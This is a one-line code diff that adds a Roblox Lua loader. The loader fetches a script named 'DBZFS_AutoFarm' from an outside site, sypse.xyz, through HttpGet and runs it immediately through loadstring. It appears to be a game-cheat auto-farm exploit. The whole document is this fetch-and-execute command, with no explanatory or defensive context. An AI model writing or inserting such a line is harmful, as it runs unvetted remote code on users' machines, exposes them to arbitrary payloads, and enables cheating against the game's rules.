@@ -1,0 +1,1 @@
+loadstring(game:HttpGet('https://sypse.xyz/free_scripts/DBZFS_AutoFarm.php'))();
